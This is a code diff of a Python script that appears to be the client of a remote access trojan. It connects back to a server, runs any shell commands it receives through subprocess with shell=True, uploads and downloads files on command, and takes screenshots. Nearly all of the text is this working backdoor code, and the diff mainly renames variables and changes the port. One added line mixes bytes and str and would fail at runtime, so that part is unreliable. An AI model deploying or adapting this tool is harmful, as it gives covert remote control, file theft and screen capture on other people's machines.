@@ -9,10 +9,10 @@ import mss
 #Error handing
     # Shell cmds
     # File management
-    
 
 
-address = ("0.0.0.0", 3000)
+
+address = ("0.0.0.0", 3232)
 
 def take_screen_shot():
     if len(mss.mss().monitors) > 0:
@@ -24,7 +24,7 @@ def take_screen_shot():
 
 def recv(buff_size=1024):
     data_size = int(server_con.recv(12).decode())
-    
+
     data = bytes()
     while len(data) < data_size:
         data += server_con.recv(buff_size)
@@ -42,19 +42,17 @@ def upload_file(file_name):
         with open(file_name, "rb") as file:
             file_data = file.read()
             send(file_data)
-        done = recv().decode()
-        print(done)
-        
+
+        is_done = recv().decode()
     except:
         print("Error opening file")
         send(b'')
 
 def download_file(file_name, file_path):
-    file_data = recv()
+    file_data = recv(buff_size=4096)
     if not file_data:
         print("Could not download file...")
         return
-        
     try:
         file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
         file.write(file_data)
@@ -66,39 +64,40 @@ def download_file(file_name, file_path):
 def open_shell():
     while True:
         print("waiting for cmd...")
-        data = recv()
+        cmd = recv()
         str_msg = b""
-        
-        if not data:
+
+        if not cmd:
             continue
-        
-        data = data.decode()
-        
-        if data == "exit":
+
+        cmd = cmd.decode()
+
+        if cmd == "exit":
             break
-        elif data[:2] == "cd":
-            dir = data[3:]
+        elif cmd[:2] == "cd":
+            dir = cmd[3:]
             try:
                 os.chdir(dir)
             except FileNotFoundError as e:
                 str_msg = str(e).encode()
             else:
-                str_msg = os.getcwd().encode()
+                str_msg = os.getcwd().encode()+"\n"
 
-        elif data[:2] == "dw":
-            file_name = data[3:]
+        elif cmd[:2] == "dw":
+            file_name = cmd[3:]
             print(f"Uploading File...{file_name}")
             upload_file(file_name)
             continue
 
-        elif data[:2] == "up":
-            file_name = data[3:]
+        elif cmd[:2] == "up":
+            file_name = cmd[3:]
             print(f"Downloading File...{file_name}")
             download_file(file_name=file_name, file_path=os.getcwd())
             continue
 
-        output = subprocess.Popen(f'{data}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
-        str_msg = output[0] + output[1]
+        else:
+            output = subprocess.Popen(f'{cmd}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+            str_msg = output[0] + output[1]
 
         send(str_msg)
 
